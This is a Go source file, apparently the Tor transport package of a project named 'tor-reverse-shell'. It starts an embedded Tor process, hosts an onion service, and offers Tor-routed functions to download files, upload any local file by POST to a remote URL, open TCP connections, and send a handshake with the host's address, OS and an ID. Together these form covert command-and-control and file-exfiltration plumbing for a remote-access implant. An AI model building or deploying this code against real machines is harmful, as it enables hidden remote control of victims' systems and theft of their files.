package tor

import (
	"bytes"
	"context"
	"errors"
	"fmt"
	"io"
	"io/ioutil"
	"mime/multipart"
	"net"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"time"

	"github.com/cretz/bine/tor"
	"github.com/humbertovnavarro/tor-reverse-shell/pkg/config"
	"github.com/ipsn/go-libtor"
)

var torListenConf = &tor.ListenConf{
	RemotePorts: []int{80},
	Version3:    true,
	Detach:      false,
}

var torStartConf = &tor.StartConf{
	ProcessCreator: libtor.Creator,
	DebugWriter:    os.Stdout,
	DataDir:        fmt.Sprintf("%s/%s", config.UserDir, "tor"),
}

var Tor *TorContext
var HttpClient *http.Client
var TorClient *tor.Tor
var Onion *tor.OnionService

type TorContext struct {
	HttpClient *http.Client
	Tor        *tor.Tor
	Onion      *tor.OnionService
	Dialer     *tor.Dialer
}

func New() (*TorContext, error) {
	t, err := tor.Start(context.Background(), torStartConf)
	if err != nil {
		return nil, err
	}
	Tor = &TorContext{
		Tor: t,
	}
	err = Tor.newOnionService()
	if err != nil {
		return nil, err
	}
	err = Tor.NewHTTPClient()
	if err != nil {
		return nil, err
	}
	return Tor, nil
}

func (c *TorContext) newOnionService() error {
	if c.Tor == nil {
		return errors.New("tor: the tor service is nil")
	}
	ctx, cancel := context.WithTimeout(context.Background(), 3*time.Minute)
	defer cancel()
	onion, err := c.Tor.Listen(ctx, torListenConf)
	if err != nil {
		return err
	}
	c.Onion = onion
	return nil
}

func (c *TorContext) NewHTTPClient() error {
	dialer, err := c.NewDialer()
	if err != nil {
		return err
	}
	c.HttpClient = &http.Client{Transport: &http.Transport{DialContext: dialer.DialContext}}
	return nil
}

func (c *TorContext) NewDialer() (*tor.Dialer, error) {
	if c.Dialer != nil {
		return c.Dialer, nil
	}
	dialCtx, dialCancel := context.WithTimeout(context.Background(), time.Minute)
	defer dialCancel()
	_dialer, err := c.Tor.Dialer(dialCtx, nil)
	c.Dialer = _dialer
	if err != nil {
		return nil, err
	}
	return c.Dialer, nil
}

type Handshake struct {
	Address string `json:"address"`
	Os      string `json:"os"`
	UUID    string `json:"id"`
}

// Download a file using the tor httpClient
func (c *TorContext) DownloadFile(path string, fromURL string) error {
	resp, err := c.HttpClient.Get(fromURL)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	out, err := os.Create(path)
	if err != nil {
		return err
	}
	defer out.Close()
	_, err = io.Copy(out, resp.Body)
	return err
}

type FileContents struct {
	fname string
	ftype string
	fdata []byte
}

// Upload a system file using the tor httpClient
func (c *TorContext) UploadFile(path string, toURL string) error {
	var (
		buf = new(bytes.Buffer)
		w   = multipart.NewWriter(buf)
	)
	f, err := fileContentsFromPath(path)
	if err != nil {
		return err
	}
	part, err := w.CreateFormFile(f.ftype, filepath.Base(f.fname))
	if err != nil {
		return err
	}
	part.Write(f.fdata)
	w.Close()
	req, err := http.NewRequest("POST", toURL, buf)
	if err != nil {
		return err
	}
	req.Header.Add("Content-Type", w.FormDataContentType())
	res, err := c.HttpClient.Do(req)
	if err != nil {
		return err
	}
	res.Body.Close()
	return nil
}

// Create a file contents, and infer the mime type and name
func fileContentsFromPath(path string) (*FileContents, error) {
	file, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	s := strings.Split(path, "/")
	fileBytes, err := ioutil.ReadAll(file)
	if err != nil {
		return nil, err
	}
	http.DetectContentType(fileBytes)
	fileName := s[len(s)-1]
	contentType := http.DetectContentType(fileBytes)
	return &FileContents{
		fname: fileName,
		fdata: fileBytes,
		ftype: contentType,
	}, nil
}

func (c *TorContext) NewTCPConn(addr string) (net.Conn, error) {
	dialer, err := c.NewDialer()
	if err != nil {
		return nil, err
	}
	return dialer.Dial("tcp", addr)
}
